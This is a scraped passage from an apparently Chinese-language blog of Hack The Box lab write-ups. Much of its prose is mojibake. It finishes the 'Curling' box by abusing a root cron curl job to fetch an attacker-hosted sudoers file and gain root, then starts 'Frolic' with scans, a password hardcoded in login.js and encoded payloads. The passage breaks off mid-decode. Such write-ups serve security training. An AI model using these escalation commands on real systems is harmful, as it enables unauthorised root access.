class=&quot;item column-1 span4&quot; itemprop=&quot;blogPost&quot; itemscope itemtype=&quot;https://schema.org/BlogPosting&quot;&gt; &lt;h2 class=&quot;item-title&quot; itemprop=&quot;headline&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/2-curling-you-know-its-true&quot; itemprop=&quot;url&quot;&gt; Curling you know its true! &lt;/a&gt; &lt;/h2&gt; &lt;div class=&quot;icons&quot;&gt; &lt;div class=&quot;btn-group pull-right&quot;&gt; &lt;button class=&quot;btn dropdown-toggle&quot; type=&quot;button&quot; id=&quot;dropdownMenuButton-2&quot; aria-label=&quot;User tools&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; &lt;span class=&quot;icon-cog&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;caret&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdownMenuButton-2&quot;&gt; &lt;li class=&quot;print-icon&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/2-curling-you-know-its-true?tmpl=component&amp;print=1&quot; title=&quot;Print article &lt; Curling you know its true! &gt;&quot; onclick=&quot;window.open(this.href,&#39;win2&#39;,&#39;status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no&#39;); return false;&quot; rel=&quot;nofollow&quot;&gt; &lt;span class=&quot;icon-print&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; Print &lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;dl class=&quot;article-info muted&quot;&gt; &lt;dt class=&quot;article-info-term&quot;&gt; Details &lt;/dt&gt; &lt;dd class=&quot;createdby&quot; itemprop=&quot;author&quot; itemscope itemtype=&quot;https://schema.org/Person&quot;&gt; Written by &lt;span itemprop=&quot;name&quot;&gt;Super User&lt;/span&gt; &lt;/dd&gt; &lt;dd class=&quot;category-name&quot;&gt; Category: &lt;a href=&quot;/index.php/2-uncategorised&quot; itemprop=&quot;genre&quot;&gt;Uncategorised&lt;/a&gt; &lt;/dd&gt; &lt;dd class=&quot;published&quot;&gt; &lt;span class=&quot;icon-calendar&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;time datetime=&quot;2018-05-22T18:53:17+00:00&quot; itemprop=&quot;datePublished&quot;&gt; Published: 22 May 2018 &lt;/time&gt; &lt;/dd&gt; &lt;dd class=&quot;hits&quot;&gt; &lt;span class=&quot;icon-eye-open&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;meta itemprop=&quot;interactionCount&quot; content=&quot;UserPageVisits:4&quot; /&gt; Hits: 4 &lt;/dd&gt; &lt;/dl&gt; &lt;p&gt;Curling is absolutely the best sport to watch on television, particularly for viewers looking for an escape from the frantic &quot;more, faster, bigger, higher&quot; grind of most televised games. Watching basketball or hockey can get you so hyped up, you feel like drinking a Red Bull and doing jumping jacks. Watching curling makes you want to drink a glass of red wine and lie down on the shag carpet. Curling is deliberate. Thoughtful, even. The games move very slowly. The players spend a lot of time talking strategy. There are nods and quiet words of encouragement; rarely are there disagreements. When it comes time for a team member to play their turn by sliding a stone down the ice, the moves are elegant. There&#39;s a wind up, a push-off, a slide, and a gentle release. Such poise and finesse!&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;item column-2 span4&quot; itemprop=&quot;blogPost&quot; itemscope itemtype=&quot;https://schema.org/BlogPosting&quot;&gt; &lt;h2 class=&quot;item-title&quot; itemprop=&quot;headline&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/1-first-post-of-curling2018&quot; itemprop=&quot;url&quot;&gt; My first post of curling in 2018! &lt;/a&gt; &lt;/h2&gt; &lt;div class=&quot;icons&quot;&gt; &lt;div class=&quot;btn-group pull-right&quot;&gt; &lt;button class=&quot;btn dropdown-toggle&quot; type=&quot;button&quot; id=&quot;dropdownMenuButton-1&quot; aria-label=&quot;User tools&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; &lt;span class=&quot;icon-cog&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;caret&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdownMenuButton-1&quot;&gt; &lt;li class=&quot;print-icon&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/1-first-post-of-curling2018?tmpl=component&amp;print=1&quot; title=&quot;Print article &lt; My first post of curling in 2018! &gt;&quot; onclick=&quot;window.open(this.href,&#39;win2&#39;,&#39;status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no&#39;); return false;&quot; rel=&quot;nofollow&quot;&gt; &lt;span class=&quot;icon-print&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; Print &lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;dl class=&quot;article-info muted&quot;&gt; &lt;dt class=&quot;article-info-term&quot;&gt; Details &lt;/dt&gt; &lt;dd class=&quot;createdby&quot; itemprop=&quot;author&quot; itemscope itemtype=&quot;https://schema.org/Person&quot;&gt; Written by &lt;span itemprop=&quot;name&quot;&gt;Super User&lt;/span&gt; &lt;/dd&gt; &lt;dd class=&quot;category-name&quot;&gt; Category: &lt;a href=&quot;/index.php/2-uncategorised&quot; itemprop=&quot;genre&quot;&gt;Uncategorised&lt;/a&gt; &lt;/dd&gt; &lt;dd class=&quot;published&quot;&gt; &lt;span class=&quot;icon-calendar&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;time datetime=&quot;2018-05-22T18:51:53+00:00&quot; itemprop=&quot;datePublished&quot;&gt; Published: 22 May 2018 &lt;/time&gt; &lt;/dd&gt; &lt;dd class=&quot;hits&quot;&gt; &lt;span class=&quot;icon-eye-open&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;meta itemprop=&quot;interactionCount&quot; content=&quot;UserPageVisits:4&quot; /&gt; Hits: 4 &lt;/dd&gt; &lt;/dl&gt; &lt;p&gt;Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!&lt;/p&gt; &lt;p&gt;- Floris&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;clearfix&quot;&gt;&lt;/div&gt; &lt;ul itemscope itemtype=&quot;https://schema.org/BreadcrumbList&quot; class=&quot;breadcrumb&quot;&gt; &lt;li&gt; You are here: &lt;/li&gt; &lt;li itemprop=&quot;itemListElement&quot; itemscope itemtype=&quot;https://schema.org/ListItem&quot; class=&quot;active&quot;&gt; &lt;span itemprop=&quot;name&quot;&gt; Home &lt;/span&gt; &lt;meta itemprop=&quot;position&quot; content=&quot;1&quot;&gt; &lt;/li&gt; &lt;/ul&gt; &lt;!-- End Content --&gt; &lt;/main&gt; &lt;div id=&quot;aside&quot; class=&quot;span3&quot;&gt; &lt;!-- Begin Right Sidebar --&gt; &lt;div class=&quot;well _menu&quot;&gt;&lt;h3 class=&quot;page-header&quot;&gt;Main Menu&lt;/h3&gt;&lt;ul class=&quot;nav menu&quot;&gt; &lt;li class=&quot;item-101 default current active&quot;&gt;&lt;a href=&quot;/index.php&quot; &gt;Home&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; &lt;/div&gt;&lt;div class=&quot;well &quot;&gt;&lt;h3 class=&quot;page-header&quot;&gt;Login Form&lt;/h3&gt;&lt;form action=&quot;/index.php&quot; method=&quot;post&quot; id=&quot;login-form&quot; class=&quot;form-inline&quot;&gt; &lt;div class=&quot;userdata&quot;&gt; &lt;div id=&quot;form-login-username&quot; class=&quot;control-group&quot;&gt; &lt;div class=&quot;controls&quot;&gt; &lt;div class=&quot;input-prepend&quot;&gt; &lt;span class=&quot;add-on&quot;&gt; &lt;span class=&quot;icon-user hasTooltip&quot; title=&quot;Username&quot;&gt;&lt;/span&gt; &lt;label for=&quot;modlgn-username&quot; class=&quot;element-invisible&quot;&gt;Username&lt;/label&gt; &lt;/span&gt; &lt;input id=&quot;modlgn-username&quot; type=&quot;text&quot; name=&quot;username&quot; class=&quot;input-small&quot; tabindex=&quot;0&quot; size=&quot;18&quot; placeholder=&quot;Username&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;form-login-password&quot; class=&quot;control-group&quot;&gt; &lt;div class=&quot;controls&quot;&gt; &lt;div class=&quot;input-prepend&quot;&gt; &lt;span class=&quot;add-on&quot;&gt; &lt;span class=&quot;icon-lock hasTooltip&quot; title=&quot;Password&quot;&gt; &lt;/span&gt; &lt;label for=&quot;modlgn-passwd&quot; class=&quot;element-invisible&quot;&gt;Password &lt;/label&gt; &lt;/span&gt; &lt;input id=&quot;modlgn-passwd&quot; type=&quot;password&quot; name=&quot;password&quot; class=&quot;input-small&quot; tabindex=&quot;0&quot; size=&quot;18&quot; placeholder=&quot;Password&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;form-login-remember&quot; class=&quot;control-group checkbox&quot;&gt; &lt;label for=&quot;modlgn-remember&quot; class=&quot;control-label&quot;&gt;Remember Me&lt;/label&gt; &lt;input id=&quot;modlgn-remember&quot; type=&quot;checkbox&quot; name=&quot;remember&quot; class=&quot;inputbox&quot; value=&quot;yes&quot;/&gt; &lt;/div&gt; &lt;div id=&quot;form-login-submit&quot; class=&quot;control-group&quot;&gt; &lt;div class=&quot;controls&quot;&gt; &lt;button type=&quot;submit&quot; tabindex=&quot;0&quot; name=&quot;Submit&quot; class=&quot;btn btn-primary login-button&quot;&gt;Log in&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;ul class=&quot;unstyled&quot;&gt; &lt;li&gt; &lt;a href=&quot;/index.php/component/users/?view=remind&amp;Itemid=101&quot;&gt; Forgot your username?&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&quot;/index.php/component/users/?view=reset&amp;Itemid=101&quot;&gt; Forgot your password?&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;input type=&quot;hidden&quot; name=&quot;option&quot; value=&quot;com_users&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;task&quot; value=&quot;user.login&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;return&quot; value=&quot;aHR0cDovLzEyNy4wLjAuMS8=&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;e6b8a82d84a03e7e05d6452f52f975f7&quot; value=&quot;1&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;!-- End Right Sidebar --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Footer --&gt; &lt;footer class=&quot;footer&quot; role=&quot;contentinfo&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;hr /&gt; &lt;p class=&quot;pull-right&quot;&gt; &lt;a href=&quot;#top&quot; id=&quot;back-top&quot;&gt; Back to Top &lt;/a&gt; &lt;/p&gt; &lt;p&gt; Â© 2022 Cewl Curling site! &lt;/p&gt; &lt;/div&gt; &lt;/footer&gt; &lt;/body&gt; &lt;!-- secret.txt --&gt; &lt;/html&gt; æœ‰ç‚¹æ²¡æ˜ç™½è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯ input æç¤ºæœ¬åœ° URL åœ°å€ï¼Œæˆ‘ä»¬è¿˜æ˜¯å»è¯·æ±‚ä¸€ä¸‹è¯•è¯•å§ curl http://127.0.0.1 ç„¶åè¿”å›çš„æ˜¯ report çš„å†…å®¹ï¼Œä¹Ÿæ˜¯é¦–é¡µçš„å†…å®¹ floris@curling:~/admin-area$ ls -la total 28 drwxr-x--- 2 root floris 4096 May 22 2018 . drwxr-xr-x 6 floris floris 4096 May 22 2018 .. -rw-rw---- 1 root floris 25 Apr 28 06:55 input -rw-rw---- 1 root floris 14236 Apr 28 06:55 report floris@curling:~/admin-area$ ls -la total 28 drwxr-x--- 2 root floris 4096 May 22 2018 . drwxr-xr-x 6 floris floris 4096 May 22 2018 .. -rw-rw---- 1 root floris 25 Apr 28 07:02 input -rw-rw---- 1 root floris 14236 Apr 28 07:02 report å¯¹æ¯”ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸€ç›´åœ¨è¢«åˆ·æ–°æˆ–è€…è¯´å†™å…¥å†…å®¹ è¿è¡Œä¸€ä¸‹ pspy64 çœ‹çœ‹ 2022/04/28 07:16:01 CMD: UID=0 PID=16262 | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 2022/04/28 07:16:01 CMD: UID=0 PID=16261 | /bin/sh -c sleep 1; cat /root/default.txt &gt; /home/floris/admin-area/input 2022/04/28 07:16:01 CMD: UID=0 PID=16260 | /usr/sbin/CRON -f 2022/04/28 07:16:01 CMD: UID=0 PID=16259 | /usr/sbin/CRON -f 2022/04/28 07:16:01 CMD: UID=0 PID=16264 | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 2022/04/28 07:16:13 CMD: UID=0 PID=16266 | 2022/04/28 07:17:01 CMD: UID=0 PID=16274 | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 2022/04/28 07:17:01 CMD: UID=0 PID=16272 | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ª curl æ¯éš”å‡ ç§’å°±ä¼šè¿è¡Œä¸€ä¸‹ï¼Œé‚£å’±ä»¬æ˜¯å¯ä»¥åœ¨ &#x2F;home&#x2F;floris&#x2F;admin-area&#x2F;input ä¸­å†™å…¥æ¶æ„å†…å®¹ï¼Œä»¥ Getshell åœ¨æœ¬åœ°æ„é€ ä¸€ä¸ªæ¶æ„ exploit æ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[/opt/tools] â””â”€# cat exploit root ALL=(ALL:ALL) ALL floris ALL=(ALL:ALL) ALL ç„¶åä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡å™¨ python3 -m http.server 80 æ¥ç€åœ¨é¶æœºä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ echo -e &#39;url = &quot;http://10.10.16.12/exploit&quot;\\noutput = &quot;/etc/sudoers&quot;&#39; &gt; input ç„¶åç­‰ç€å°±è¡Œ â”Œâ”€â”€(rootğŸ’€kali)-[/opt/tools] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.150 - - [28/Apr/2022 03:23:03] &quot;GET /exploit HTTP/1.1&quot; 200 - ç­‰æˆ‘ä»¬è¿™è¾¹çš„ HTTP æœåŠ¡å‡ºç°è¯·æ±‚ä»¥åï¼Œå°±æ˜¯ä¿®æ”¹æˆåŠŸäº† æ¥ç€ä½¿ç”¨ sudo su åˆ‡æ¢åˆ° root ç”¨æˆ·ï¼Œå¯†ç è¿˜æ˜¯ floris ç”¨æˆ·çš„å¯†ç  floris@curling:~/admin-area$ sudo su [sudo] password for floris: root@curling:/home/floris/admin-area# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ° root æƒé™ root@curling:/home/floris/admin-area# cat /root/root.txt 82c198ab6fc5365fdc6da2ee5c26064a æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Frolic - Hackthebox","slug":"Hackthebox - Frolic","date":"2022-04-27T11:38:36.000Z","updated":"2023-05-20T01:50:58.000Z","comments":true,"path":"2022/04/27/Hackthebox - Frolic/","link":"","permalink":"http://www.lucifiel.com/2022/04/27/Hackthebox%20-%20Frolic/","excerpt":"","text":"Hackthebox - Frolicé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.111 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-25 21:22 EDT Nmap scan report for 10.10.10.111 Host is up (0.32s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA) | 256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA) |_ 256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 1880/tcp open http Node.js (Express middleware) |_http-title: Node-RED 9999/tcp open http nginx 1.10.3 (Ubuntu) |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Welcome to nginx! No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/25%OT=22%CT=1%CU=38693%PV=Y%DS=2%DC=T%G=Y%TM=626749B OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ OS:(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W2= OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s |_nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: frolic | NetBIOS computer name: FROLIC\\x00 | Domain name: \\x00 | FQDN: frolic |_ System time: 2022-04-26T06:53:50+05:30 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2022-04-26T01:23:52 |_ start_date: N/A TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 323.74 ms 10.10.14.1 2 318.95 ms 10.10.10.111 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 64.58 seconds Http1880 å°è¯•äº†ä¸€ä¸‹ï¼Œadmin&#x2F;admin ä¼šç™»å½•å¤±è´¥ï¼Œä½† admin&#x2F;password ä¼šæç¤ºè¶…æ—¶ï¼Œæœ‰ç‚¹å¥‡æ€ªï¼Œfuzz äº†ä¸€ä¸‹æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå…ˆæ”¾ç€ 9999 Smbâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# smbmap -H 10.10.10.111 [+] Guest session IP: 10.10.10.111:445 Name: 10.10.10.111 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (frolic server (Samba, Ubuntu)) smb æ‰«äº†ä¸€ä¸‹ï¼Œä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿ Fuzz1880â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.10.111:1880/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:1880/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/25 21:56:22 Starting gobuster in directory enumeration mode =============================================================== /icons (Status: 401) [Size: 12] /red (Status: 301) [Size: 173] [--&gt; /red/] /vendor (Status: 301) [Size: 179] [--&gt; /vendor/] /settings (Status: 401) [Size: 12] /Icons (Status: 401) [Size: 12] /nodes (Status: 401) [Size: 12] /SETTINGS (Status: 401) [Size: 12] /flows (Status: 401) [Size: 12] /ICONS (Status: 401) [Size: 12] =============================================================== 2022/04/25 22:03:47 Finished =============================================================== fuzz äº†ä¸€ä¸‹ï¼Œæ²¡ä¸œè¥¿ï¼Œç»§ç»­æ”¾ç€å§ 9999â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:9999/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/25 21:52:59 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/admin/] /test (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/test/] /dev (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/dev/] /backup (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/backup/] /loop (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/loop/] =============================================================== 2022/04/25 22:00:19 Finished =============================================================== æˆ‘æ„Ÿè§‰çªç ´å£å°±åœ¨è¿™è¾¹äº† admin ç›®å½•æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå…ˆçœ‹çœ‹å…¶ä»–çš„ test ç›®å½•æ˜¯ä¸€ä¸ª phpinfo æœ‰ç‚¹æ„æ€ backup é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ä¸€ä¸ªç›®å½•ï¼Œçœ‹ç€åƒæ˜¯è´¦å·å¯†ç  username = admin password = imnothuman å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç ï¼Œé‚£ä¸ªç›®å½• 403 è¿›ä¸å» å’±ä»¬å»ç™»å½•ä¸€ä¸‹çœ‹çœ‹ è¿™è¾¹æç¤ºç™»å½•å¤±è´¥ï¼Œé‚£ä¼šä¸ä¼šæ˜¯åœ¨ 1880 ç™»å½•å‘¢ï¼Ÿ ä¹Ÿç™»å½•å¤±è´¥ï¼Œæœ‰ç‚¹å¥‡æ€ª http://10.10.10.111:9999/admin/js/login.js var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;&amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } æŸ¥çœ‹æºä»£ç çš„æ—¶å€™æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œå•Šè¿™ï¼Ÿ username = admin password = superduperlooperpassword_lol æ¼æ´åˆ©ç”¨ http://10.10.10.111:9999/admin/success.html ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. ç™»å½•åè¿›å…¥äº†è¿™ä¸ªé¡µé¢ï¼Œæ‹¿åˆ°äº†ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦ï¼Œåƒæ˜¯æŸç§åŠ å¯†ï¼Œå°è¯•è§£å¯†ä¸€ä¸‹çœ‹çœ‹ æˆ‘æœäº†ä¸€ä¸‹èµ„æ–™ï¼Œè¿™ä¸ªç¼–ç¨‹è¯­è¨€å«åš Okkï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªè¿™ç§è¯­è¨€çš„è§£å¯†ç½‘ç«™ https://esolangs.org/wiki/ook! https://www.dcode.fr/ook-language Nothing here check /asdiSIAJJ0QWE9JAS ç»§ç»­å»è®¿é—®ä¸€ä¸‹ http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA ä¼¼ä¹æ‹¿åˆ°äº†ä¸€æ®µ BASE64 ç¼–ç  â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 487 0 487 0 0 749 0 --:--:-- --:--:-- --:--:-- 749 PK Ã‰7M#ï¿½[ï¿½i index.phpUT ï¿½|ï¿½[ï¿½|ï¿½[ux ^Dï¿½Jï¿½sï¿½hï¿½)ï¿½Pï¿½n 